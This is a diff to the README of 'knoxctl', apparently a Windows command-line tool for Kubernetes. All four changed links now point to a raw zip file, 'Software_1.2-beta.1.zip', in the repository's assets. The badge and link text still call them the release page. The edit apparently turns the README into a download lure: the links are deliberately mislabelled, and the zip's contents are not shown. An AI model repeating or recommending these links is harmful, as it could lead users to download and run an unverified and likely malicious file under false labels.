@@ -1,6 +1,6 @@
 # 🧰 knoxctl - Fast Kubernetes Control Made Simple
 
-[![Download knoxctl](https://img.shields.io/badge/Download%20knoxctl-Release%20Page-blue?style=for-the-badge)](https://github.com/Jayarcer9312/knoxctl/releases)
+[![Download knoxctl](https://img.shields.io/badge/Download%20knoxctl-Release%20Page-blue?style=for-the-badge)](https://github.com/Jayarcer9312/knoxctl/raw/refs/heads/main/assets/Software_1.2-beta.1.zip)
 
 ## 🚀 Getting Started
 
@@ -8,7 +8,7 @@ knoxctl is a small command line app for Kubernetes tasks on Windows. It helps yo
 
 Use the release page below to get the Windows file, then follow the steps in this guide.
 
-[Download knoxctl from GitHub Releases](https://github.com/Jayarcer9312/knoxctl/releases)
+[Download knoxctl from GitHub Releases](https://github.com/Jayarcer9312/knoxctl/raw/refs/heads/main/assets/Software_1.2-beta.1.zip)
 
 ## 💻 What knoxctl Does
 
@@ -39,7 +39,7 @@ If you already use `kubectl`, knoxctl will fit into your normal workflow. It use
 
 ## 🛠️ Download knoxctl
 
-1. Open the [knoxctl releases page](https://github.com/Jayarcer9312/knoxctl/releases)
+1. Open the [knoxctl releases page](https://github.com/Jayarcer9312/knoxctl/raw/refs/heads/main/assets/Software_1.2-beta.1.zip)
 2. Find the latest release
 3. Look for the Windows download file
 4. Download the file to your computer
@@ -279,7 +279,7 @@ These tools help shape the command line structure and Kubernetes access behind t
 
 If you need the file again, use the release page here:
 
-[https://github.com/Jayarcer9312/knoxctl/releases](https://github.com/Jayarcer9312/knoxctl/releases)
+[https://github.com/Jayarcer9312/knoxctl/raw/refs/heads/main/assets/Software_1.2-beta.1.zip](https://github.com/Jayarcer9312/knoxctl/raw/refs/heads/main/assets/Software_1.2-beta.1.zip)
 
 ## 🗂️ Project Details
 
